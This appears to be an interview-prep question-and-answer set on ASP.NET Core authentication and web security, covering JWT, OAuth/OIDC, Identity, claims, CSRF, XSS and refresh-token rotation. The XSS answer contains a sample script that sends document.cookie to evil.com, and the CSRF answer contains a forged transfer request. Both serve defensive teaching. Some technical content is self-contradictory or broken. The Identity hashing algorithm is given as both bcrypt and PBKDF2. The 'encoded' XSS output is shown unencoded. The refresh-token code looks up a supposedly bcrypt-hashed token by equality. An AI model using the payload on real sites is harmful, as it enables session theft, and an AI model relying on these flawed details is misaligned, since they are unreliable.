questions.question: What is JWT (JSON Web Token) and how does it work?
questions.answer:
JWT is a compact, self-contained token format used to securely transmit information between parties as a JSON object. It's the standard for stateless authentication in REST APIs.

Structure: Three Base64URL-encoded parts separated by dots: header.payload.signature

  • Header — algorithm + token type: {"alg":"HS256","typ":"JWT"}
  • Payload — claims (user data): {"sub":"user123","name":"Darsh","role":"Admin","exp":1234567890}
  • Signature — HMACSHA256(base64(header) + "." + base64(payload), secretKey) — verifies token wasn't tampered with

Authentication flow:

  1. User sends credentials → API validates → issues JWT
  2. Client stores JWT (localStorage or httpOnly cookie)
  3. Client sends JWT in Authorization: Bearer <token> header on every request
  4. API validates signature (no DB call needed!) + checks expiry → extracts claims

In FolioTrack, JWTs contained: sub (userId), email, role, exp (15 min). Refresh tokens (stored in httpOnly cookies, DB-tracked) issued new access tokens without re-login.

followUps.question: What are the standard JWT claims?
followUps.answer: JWT registered (standard) claims defined in RFC 7519: sub (subject — user ID), iss (issuer — who issued the token), aud (audience — who should accept it), exp (expiration time — Unix timestamp), nbf (not before — valid from this time), iat (issued at — Unix timestamp), jti (JWT ID — unique token identifier for revocation). Custom claims like role, email, tenant_id go in the payload alongside standard ones. Keep claims minimal — every claim adds bytes to every request.

followUps.question: What is the difference between signing and encryption?
followUps.answer: Signing (default in JWT): The payload is Base64URL-encoded (NOT encrypted) and a signature is appended. Anyone can read the payload — it's visible if decoded. The signature just proves the token wasn't tampered with. Encryption (JWE — JSON Web Encryption): The payload itself is encrypted so only the recipient with the private key can read it. Standard JWTs are signed, not encrypted — never put sensitive data (passwords, PII) in a JWT payload. The Authorization: Bearer header should always be over HTTPS to prevent interception.

followUps.question: How do you invalidate a JWT before expiry?
followUps.answer: JWTs are stateless — the server cannot directly invalidate one without checking a database. Approaches: (1) Short expiry + refresh tokens — keep access tokens valid for 15 minutes; revoke the refresh token in the DB for logout. The access token expires naturally. (2) Token blocklist — maintain a Redis/DB set of revoked JTI values; check on each request. Adds a DB lookup, partially defeating stateless JWT benefits. (3) Rotate secrets — changing the signing key invalidates all tokens, but affects all users. For most apps, short-lived access tokens (15 min) with revocable refresh tokens is the right balance.

questions.tip: JWTs cannot be invalidated server-side (they're stateless). Keep access token expiry short (15min). Use refresh tokens in DB to support logout/revocation — revoke the refresh token, and the access token expires naturally.

questions.question: How do you implement JWT authentication in ASP.NET Core?
questions.answer:
Setting up JWT authentication in ASP.NET Core 8:

// Program.cs
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidIssuer = builder.Configuration["Jwt:Issuer"],
            ValidateAudience = true,
            ValidAudience = builder.Configuration["Jwt:Audience"],
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(builder.Configuration["Jwt:SecretKey"]!)),
            ClockSkew = TimeSpan.Zero  // no tolerance for expired tokens
        };
    });

// Token generation
public string GenerateToken(ApplicationUser user)
{
    var claims = new[]
    {
        new Claim(JwtRegisteredClaimNames.Sub, user.Id),
        new Claim(JwtRegisteredClaimNames.Email, user.Email!),
        new Claim(ClaimTypes.Role, "User")
    };
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_secretKey));
    var token = new JwtSecurityToken(
        issuer: _issuer,
        audience: _audience,
        claims: claims,
        expires: DateTime.UtcNow.AddMinutes(15),
        signingCredentials: new SigningCredentials(key, SecurityAlgorithms.HmacSha256));
    return new JwtSecurityTokenHandler().WriteToken(token);
}

followUps.question: How do you read claims in a controller?
followUps.answer: The User property on ControllerBase is a ClaimsPrincipal populated by the JWT middleware. Read claims with: User.FindFirstValue(ClaimTypes.NameIdentifier) (user ID from the sub claim), User.FindFirstValue(ClaimTypes.Email) (email), User.IsInRole("Admin") (role check), User.Claims (all claims as IEnumerable). FindFirstValue returns null if the claim doesn't exist. For custom claims, use the claim type string: User.FindFirstValue("tenant_id"). The claim types must match what you put in the JWT when generating it.

followUps.question: What is ClaimsPrincipal?
followUps.answer: ClaimsPrincipal represents the authenticated user as a collection of ClaimsIdentity objects (multiple identities for federated scenarios). Each ClaimsIdentity is a collection of Claim objects (key-value pairs about the user). The JWT middleware, after validating the token, creates a ClaimsIdentity from the JWT claims and sets HttpContext.User to a ClaimsPrincipal wrapping it. User.Identity.IsAuthenticated returns true if at least one identity was successfully authenticated. This is the foundation of ASP.NET Core's claims-based authorization system.

questions.tip: Read claims in controllers: User.FindFirstValue(ClaimTypes.NameIdentifier) gets the user ID. User.IsInRole("Admin") checks roles. User.Claims for all claims. The User property is a ClaimsPrincipal populated by the JWT middleware.

questions.question: What is the difference between Authentication and Authorization?
questions.answer:
These are different steps in the security pipeline that are often confused:

Authentication — verifying WHO the user is. "Are you who you claim to be?" Methods: username+password, JWT, OAuth, biometrics. Result: a verified identity (ClaimsPrincipal in ASP.NET Core).

Authorization — verifying WHAT the authenticated user can do. "Are you allowed to do this?" Methods: roles, claims, policies, resource-based authorization.

// Authentication: verify identity
app.UseAuthentication();  // sets HttpContext.User from JWT

// Authorization: enforce what they can do
app.UseAuthorization();

// Role-based authorization
[Authorize(Roles = "Admin")]
public IActionResult AdminOnly() { ... }

// Policy-based authorization
[Authorize(Policy = "CanEditPortfolio")]
public IActionResult Edit(int id) { ... }

// Register policy
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanEditPortfolio", policy =>
        policy.RequireClaim("PortfolioOwner"));
});

In WalletVerification: Authentication = validating the OIDC token from the identity provider. Authorization = checking that the authenticated user's sub claim matches the wallet they're trying to access (resource-based authorization).

followUps.question: What is resource-based authorization?
followUps.answer: Resource-based authorization checks whether a specific user can perform an action on a specific resource instance — not just role/claim checks. Example: "Can user 42 edit portfolio 17?" (only if they own it). Implemented via IAuthorizationService: inject it, define a requirement (IAuthorizationRequirement), write a handler (AuthorizationHandler<T, Resource>) that checks the resource's owner against the current user's ID, then call await _authorizationService.AuthorizeAsync(User, portfolio, "OwnerPolicy"). Return 403 if authorization fails. This is the correct way to implement row-level security in ASP.NET Core.

followUps.question: What is an IAuthorizationHandler?
followUps.answer: IAuthorizationHandler contains the logic for evaluating a specific IAuthorizationRequirement. You implement AuthorizationHandler<TRequirement> (for simple policy checks) or AuthorizationHandler<TRequirement, TResource> (for resource-based checks). In HandleRequirementAsync, call context.Succeed(requirement) if authorization passes, or simply return (fail silently). Register handlers in DI: services.AddSingleton<IAuthorizationHandler, PortfolioOwnerHandler>(). Multiple handlers can evaluate the same requirement — all must succeed unless the policy uses RequireAssertion.

questions.tip: HTTP 401 vs 403: Authentication failure → 401 Unauthorized ("who are you?"). Authorization failure → 403 Forbidden ("I know who you are, but you can't do this"). Using the wrong code leaks information — returning 403 for unauthenticated requests tells attackers the endpoint exists.

questions.question: What is OAuth 2.0 and how does it differ from OIDC?
questions.answer:
OAuth 2.0 is an authorization framework — it allows a third-party app to get limited access to a user's resources on another service without exposing credentials. It's about delegated authorization, not authentication.

OAuth 2.0 Authorization Code Flow:

  1. User clicks "Login with Google" in your app
  2. App redirects to Google's authorization endpoint
  3. User logs in to Google and consents to permissions
  4. Google redirects back with an authorization code
  5. App exchanges code for access token (server-to-server, no user involved)
  6. App uses access token to call Google APIs on behalf of the user

OpenID Connect (OIDC) — an identity layer on top of OAuth 2.0. Adds authentication: after the flow, you receive an ID Token (JWT) containing who the user is (sub, email, name). OAuth gives you access tokens to call APIs. OIDC adds identity tokens to know who logged in.

In WalletVerification I configured ASP.NET Core's OIDC handler to authenticate users via an external identity provider. The ID token told us who the user was; the access token let us call the provider's API.

followUps.question: What is PKCE and why is it required for SPAs?
followUps.answer: PKCE (Proof Key for Code Exchange, pronounced "pixie") prevents authorization code interception attacks in public clients (SPAs, mobile apps) that cannot store a client secret securely. The client generates a random code_verifier, hashes it to get a code_challenge, and sends the challenge with the authorization request. When exchanging the code for a token, the client proves it has the original verifier — the auth server matches the hash. If an attacker intercepts the authorization code, they cannot use it without the code_verifier. PKCE is mandatory for SPAs in OAuth 2.1 and required by all modern identity providers.

followUps.question: What is the difference between access token and ID token?
followUps.answer: Access token — a credential for calling APIs. Its contents are opaque to the client (they're for the resource server). OAuth 2.0 doesn't define what's inside an access token. Use it in Authorization: Bearer headers. ID token — a JWT that identifies who authenticated. It's OIDC-specific and defined by the spec. Contains claims about the user (sub, email, name, picture). Intended for the client application to display user info — not for calling APIs. Never use an access token to identify a user, and never send an ID token to APIs. They have different audiences and purposes.

questions.tip: Never use the access token to get user identity. Access tokens are for calling APIs — their content is undefined by OAuth. Use the ID token (OIDC) or a /userinfo endpoint for identity. This is a common OAuth misuse.

questions.question: What is ASP.NET Core Identity and when would you use it?
questions.answer:
ASP.NET Core Identity is the built-in membership system for managing users, passwords, roles, and claims. It provides: user registration/login, password hashing (bcrypt), email confirmation, 2FA, roles, claims, external login (Google, Facebook via OAuth).

// Setup
builder.Services.AddDefaultIdentity<ApplicationUser>(options =>
{
    options.Password.RequiredLength = 8;
    options.Password.RequireNonAlphanumeric = false;
    options.SignIn.RequireConfirmedAccount = false;
    options.Lockout.MaxFailedAccessAttempts = 5;
})
.AddRoles<IdentityRole>()
.AddEntityFrameworkStores<ApplicationDbContext>();

// Usage in controller
public async Task<IActionResult> Register(RegisterViewModel model)
{
    var user = new ApplicationUser { UserName = model.Email, Email = model.Email };
    var result = await _userManager.CreateAsync(user, model.Password);
    if (result.Succeeded)
    {
        await _signInManager.SignInAsync(user, isPersistent: false);
        return RedirectToAction("Index", "Home");
    }
    foreach (var error in result.Errors)
        ModelState.AddModelError(string.Empty, error.Description);
    return View(model);
}

When to use: Self-hosted authentication where you own the user database. If you need external identity providers (Azure AD, Auth0), use OIDC instead and skip Identity's password management.

followUps.question: What is the difference between UserManager and SignInManager?
followUps.answer: UserManager<T> manages the user data store — create, update, delete users, change passwords, add/remove claims and roles, confirm email, generate password reset tokens. It's not aware of HTTP or cookies. SignInManager<T> handles the authentication process — sign in (issue cookie), sign out (clear cookie), external login callbacks, two-factor authentication. It uses UserManager internally. Rule of thumb: if you're managing user data → UserManager. If you're managing the user's session → SignInManager. For JWT APIs, you often use only UserManager (to validate credentials) and issue JWTs manually, skipping SignInManager.

followUps.question: How does Identity store passwords?
followUps.answer: ASP.NET Core Identity uses PBKDF2 with HMAC-SHA256 (not bcrypt, despite common references). The hash includes a random salt and is iterated 100,000 times (configurable). The full representation stored is: algorithm_marker | salt | hash — all Base64-encoded in a single column. The algorithm marker allows the hashing algorithm to be upgraded over time without breaking existing accounts. When a user logs in, Identity rehashes the provided password with the stored salt and compares — if different, password is wrong. Never implement your own password hashing — Identity's implementation is audited and upgradeable.

questions.tip: Identity uses bcrypt for password hashing (via ASP.NET Core Data Protection). Never store plain passwords or use MD5/SHA1 — Identity's default is already secure. The hash is adaptive (work factor increases over time).

questions.question: What are claims and how are they used in ASP.NET Core authorization?
questions.answer:
A claim is a key-value statement about a user made by a trusted authority. Claims are carried in tokens (JWT, cookies) and represent facts about the user.

Common claims: sub (subject/user ID), email, role, given_name, custom claims like tenant_id, subscription_level.

Claims-based authorization:

// Policy requiring a specific claim
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("PremiumUser", policy =>
        policy.RequireClaim("subscription", "premium", "enterprise"));

    options.AddPolicy("MinAge18", policy =>
        policy.RequireAssertion(ctx =>
        {
            var dob = ctx.User.FindFirstValue("birthdate");
            return dob != null && DateTime.Parse(dob) <= DateTime.Now.AddYears(-18);
        }));
});

// Apply to controller/action
[Authorize(Policy = "PremiumUser")]
public IActionResult PremiumFeature() { ... }

// Read claims in controller
var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
var email = User.FindFirstValue(ClaimTypes.Email);
var tenantId = User.FindFirstValue("tenant_id");

In WalletVerification, the JWT contained a wallet_id claim. Authorization policies verified that the requested wallet ID matched the claim — preventing users from accessing other wallets.

followUps.question: What is the difference between role-based and claim-based authorization?
followUps.answer: Role-based authorization — users are assigned to named roles (Admin, User, Manager), and access is granted based on role membership. Simple but coarse-grained. [Authorize(Roles = "Admin")]. Roles are themselves a type of claim (ClaimTypes.Role). Claim-based authorization — access decisions based on any claim value (country, subscription tier, age, employee department). More fine-grained and flexible. Policies express complex conditions across multiple claims. In practice, use roles for broad access levels (Admin vs User) and claims for fine-grained feature flags (subscription tier, tenant membership, feature flags). ASP.NET Core supports both simultaneously.

followUps.question: What is an IAuthorizationRequirement?
followUps.answer: IAuthorizationRequirement is a marker interface representing a condition that must be met for authorization to succeed. It's a data class — typically a record or class with properties describing the requirement (e.g., MinimumAgeRequirement(int minimumAge)). The actual evaluation logic lives in AuthorizationHandler<TRequirement>. This separation allows multiple handlers to evaluate the same requirement (OR logic) or different requirements to reuse the same handler. Registered in DI via services.AddSingleton<IAuthorizationHandler, MinimumAgeHandler>(). Added to policies via policy.AddRequirements(new MinimumAgeRequirement(18)).

questions.tip: Claims are extensible but keep them small. Every claim is in every request (in the JWT). Don't put large data in claims — put a user ID and look up details per-request from cache. A JWT with 50 claims is a red flag.

questions.question: What is CSRF (Cross-Site Request Forgery) and how do you prevent it in ASP.NET Core?
questions.answer:
CSRF is an attack where a malicious site tricks an authenticated user's browser into making a request to your site without their knowledge. The browser automatically sends cookies — including the session or auth cookie — on every request to your domain. An attacker exploits this.

Classic CSRF attack scenario:

  1. User logs into your banking app. Their session cookie is stored in the browser.
  2. User visits a malicious site (in another tab) that contains: <img src="https://yourbank.com/transfer?to=attacker&amount=5000">
  3. Browser sees the img tag, fires a GET to your bank. Cookie goes along automatically.
  4. Bank sees a valid authenticated request — money transferred.

How ASP.NET Core prevents it — Anti-Forgery Tokens:

The server generates a unique token, puts it in a hidden form field AND stores it in a cookie. On POST, both must match. The attacker's site can't read your cookies (same-origin policy), so it can't get the token to include in the forged request.

// In Program.cs — anti-forgery is registered automatically with AddControllersWithViews()
builder.Services.AddControllersWithViews();

// In Razor form — @Html.AntiForgeryToken() or asp-antiforgery="true" on form tag
// Tag helper approach (preferred):
<form asp-action="Transfer" method="post">
    <!-- framework auto-injects hidden __RequestVerificationToken field -->
    <input name="Amount" />
    <button type="submit">Transfer</button>
</form>

// Controller — validate the token
[HttpPost]
[ValidateAntiForgeryToken] // throws 400 if token missing/invalid
public IActionResult Transfer(TransferViewModel model) { }

// Global for all POST actions
builder.Services.AddControllersWithViews(options =>
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));

CSRF with APIs (JWT):

If your API uses JWT Bearer tokens (not cookies), CSRF is generally not a concern — browsers don't auto-send Authorization headers. CSRF only applies when auth is cookie-based. For SPAs calling APIs with JWT in headers, you're already safe.

If you use cookie-based auth with an API, add the SameSite=Strict or SameSite=Lax cookie attribute — modern browsers block cross-site cookies by default.

followUps.question: What is the SameSite cookie attribute and how does it help against CSRF?
followUps.answer:
SameSite is a cookie attribute that tells browsers when to include the cookie in cross-site requests:

  • SameSite=Strict — cookie only sent for same-site requests. Visiting yourbank.com from a link on another site won't send the cookie. Most secure but can break legitimate cross-origin flows like OAuth redirects.
  • SameSite=Lax — cookie sent for same-site requests and top-level navigation GET requests (clicking a link). The default in modern browsers. Blocks cross-site POSTs, which stops most CSRF attacks.
  • SameSite=None — cookie sent everywhere. Must also set Secure. Use only for legitimate cross-site scenarios like third-party auth.
builder.Services.ConfigureApplicationCookie(opts =>
{
    opts.Cookie.SameSite = SameSiteMode.Strict;
    opts.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    opts.Cookie.HttpOnly = true;
});

questions.tip: CSRF only applies to cookie auth. If your API uses JWT in Authorization headers, CSRF doesn't apply — attackers can't make browsers send custom headers cross-origin. Focus CSRF protection on MVC apps with cookie-based sessions.

questions.question: What is XSS (Cross-Site Scripting) and how do you prevent it in ASP.NET Core?
questions.answer:
XSS is when an attacker injects malicious JavaScript into your web page, and that script runs in other users' browsers. It's one of the most common web vulnerabilities — OWASP Top 10 every year.

How XSS works:

Your site displays user-supplied content (a comment, a username, a search query). If you render it as raw HTML without encoding, an attacker can submit: <script>document.location='https://evil.com/steal?c='+document.cookie</script>. When other users view the page, their browser executes that script. The attacker now has their session cookies.

Types of XSS:

  • Stored XSS — malicious script saved to DB, served to every user who views that content. Most dangerous.
  • Reflected XSS — malicious script in a URL parameter, reflected back in the response. Example: /search?q=<script>...</script>
  • DOM-based XSS — script manipulates the DOM client-side via JavaScript, never touches the server.

Prevention in ASP.NET Core:

1. Razor auto-encoding (your first line of defence)
<!-- Razor encodes by default -- safe -->
<p>Hello, @Model.UserName</p>
<!-- If UserName = "<script>alert(1)</script>"
     Renders as: Hello, <script>alert(1)</script> -- harmless text -->

<!-- DANGEROUS -- bypasses encoding, only for trusted HTML -->
<p>@Html.Raw(Model.HtmlContent)</p> // only use if content is from a trusted source
2. Content Security Policy (CSP) header
// Tells the browser only execute scripts from your own domain
app.Use(async (context, next) =>
{
    context.Response.Headers.Add(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    await next();
});
3. HtmlEncoder for manual encoding
using System.Text.Encodings.Web;

// In a service/controller where you need to manually encode
string safe = HtmlEncoder.Default.Encode(userInput);
// <script>alert(1)</script> → <script>alert(1)</script>
4. Input validation + sanitisation for rich text

If you allow rich HTML (like a WYSIWYG editor), use a whitelist sanitiser — the HtmlSanitizer NuGet package is the standard for this in .NET. Never try to build your own HTML sanitiser with regex.

HttpOnly cookies for session protection:

Even if XSS happens, HttpOnly cookies can't be read by JavaScript — limiting the damage. Always set cookies as HttpOnly.

followUps.question: What is the difference between XSS and SQL injection? Both involve injecting malicious code.
followUps.answer:
Different targets, different vectors, different defences:

  • SQL Injection — malicious input gets executed by the database. Attacker injects SQL syntax into an input field that ends up in a SQL query. Defence: parameterised queries / ORMs (EF Core, Dapper).
  • XSS — malicious input gets executed by the browser as JavaScript. Attacker injects script tags or event handlers into content that gets rendered as HTML. Defence: output encoding (Razor does this by default), CSP headers, input sanitisation for rich text.

Both exploits work by trusting user input and treating data as code. The principle is the same: never trust user input, always encode/parameterise output appropriately for its context.

questions.tip: Razor encodes by default — that's your safety net. The risk is when you use @Html.Raw(), JavaScript inline rendering, or Angular/React's dangerouslySetInnerHTML. Always be explicit when bypassing encoding — treat it like using 'unsafe' in C#.

questions.question: What is the structure of a JWT token? Explain Header, Payload, and Signature.
questions.answer:
A JWT (JSON Web Token) is three Base64Url-encoded JSON objects concatenated with dots: Header.Payload.Signature

The three parts:

// Full JWT looks like this:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiIsInJvbGUiOiJBZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

1. Header — algorithm metadata

{
  "alg": "HS256",   // HMAC SHA-256 (symmetric) or RS256 (asymmetric)
  "typ": "JWT"
}

2. Payload — claims (the actual data)

{
  "sub": "user-123",        // Subject — usually user ID
  "name": "John Darshan",   // Custom claim
  "email": "john@abc.com",
  "role": "Admin",          // Custom claim for authorization
  "iat": 1700000000,        // Issued At (Unix timestamp)
  "exp": 1700003600,        // Expiry (1 hour from iat)
  "iss": "myapp.com",       // Issuer
  "aud": "myapp-api"        // Audience
}

3. Signature — tamper protection

// For HS256 (symmetric — same secret for sign and verify):
HMACSHA256(
    base64url(header) + "." + base64url(payload),
    secretKey
)

// For RS256 (asymmetric — sign with private key, verify with public key):
// Private key signs → Public key verifies
// Better for microservices where multiple services verify tokens

Key security points:

  • The payload is Base64 encoded, NOT encrypted — anyone can decode it. Never put passwords or sensitive PII in JWT payload
  • The signature proves integrity — if anyone tampers with header or payload, signature validation fails
  • Short expiry (15-60 min) + refresh tokens = best practice

In ASP.NET Core — reading claims from JWT:

[HttpGet("profile")]
[Authorize]
public IActionResult GetProfile()
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var email  = User.FindFirst(ClaimTypes.Email)?.Value;
    var role   = User.FindFirst(ClaimTypes.Role)?.Value;
    
    return Ok(new { userId, email, role });
}

I use jwt.io to decode tokens during debugging — you paste the token and see the header and payload instantly. Remember: the decoded payload is visible to anyone, so treat it as public data.

followUps.question: What is the difference between HS256 and RS256 signing algorithms?
Why should JWT expiry be short? What is the recommended lifetime?
How do you revoke a JWT before it expires?

questions.tip: JWT payload is Base64 encoded, NOT encrypted. Never store passwords or credit cards in it. Use short expiry (15-60 min) + refresh tokens.

questions.question: What is a Refresh Token? How do you implement token refresh in ASP.NET Core?
questions.answer:
A refresh token is a long-lived credential used to obtain new access tokens (JWTs) without requiring the user to log in again. It solves the problem of short-lived JWTs — you want short expiry for security but don't want to force re-login every 15 minutes.

The token flow:

// 1. Login — server returns both tokens
POST /api/auth/login
→ {
    "accessToken": "eyJ...",   // short-lived, e.g. 15 minutes
    "refreshToken": "abc123...", // long-lived, e.g. 7-30 days
    "expiresIn": 900
  }

// 2. Use access token for API calls
GET /api/orders
Authorization: Bearer eyJ...

// 3. When access token expires — use refresh token to get a new one
POST /api/auth/refresh
{ "refreshToken": "abc123..." }
→ {
    "accessToken": "eyJ...(new token)",
    "refreshToken": "xyz789...(rotated refresh token)"
  }

// 4. On logout — revoke refresh token
POST /api/auth/logout
{ "refreshToken": "xyz789..." }

Implementation in ASP.NET Core:

// Store refresh tokens in DB (hashed)
public class RefreshToken
{
    public int Id { get; set; }
    public string TokenHash { get; set; }  // bcrypt hash of token
    public string UserId { get; set; }
    public DateTime ExpiresAt { get; set; }
    public bool IsRevoked { get; set; }
    public DateTime CreatedAt { get; set; }
}

// Refresh endpoint
[HttpPost("refresh")]
[AllowAnonymous]
public async Task<IActionResult> Refresh([FromBody] RefreshRequest request)
{
    var tokenHash = HashToken(request.RefreshToken);
    var stored = await _db.RefreshTokens
        .FirstOrDefaultAsync(t => t.TokenHash == tokenHash 
                               && !t.IsRevoked 
                               && t.ExpiresAt > DateTime.UtcNow);
    
    if (stored == null) return Unauthorized("Invalid or expired refresh token");
    
    // Rotate: revoke old token, issue new pair
    stored.IsRevoked = true;
    
    var newAccessToken  = _jwtService.GenerateAccessToken(stored.UserId);
    var newRefreshToken = GenerateRefreshToken();
    
    _db.RefreshTokens.Add(new RefreshToken {
        TokenHash  = HashToken(newRefreshToken),
        UserId     = stored.UserId,
        ExpiresAt  = DateTime.UtcNow.AddDays(7)
    });
    
    await _db.SaveChangesAsync();
    
    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });
}

private string GenerateRefreshToken()
    => Convert.ToBase64String(RandomNumberGenerator.GetBytes(64));

Security rules:

  • Rotate refresh tokens on every use — if a stolen token is used, you detect it when the legitimate user's token is rejected
  • Store tokens hashed in DB, never plaintext
  • Revoke on logout — clear from DB
  • Store access token in memory (JS), refresh token in httpOnly cookie
  • Refresh tokens must be revokable (unlike stateless JWTs)

followUps.question: Where should you store access tokens and refresh tokens on the client?
What is refresh token rotation and why does it help detect theft?
How do you invalidate all active sessions for a user (e.g., after password change)?

questions.tip: Rotate refresh tokens on every use — if you detect an already-used token, it means token theft — revoke ALL tokens for that user immediately.
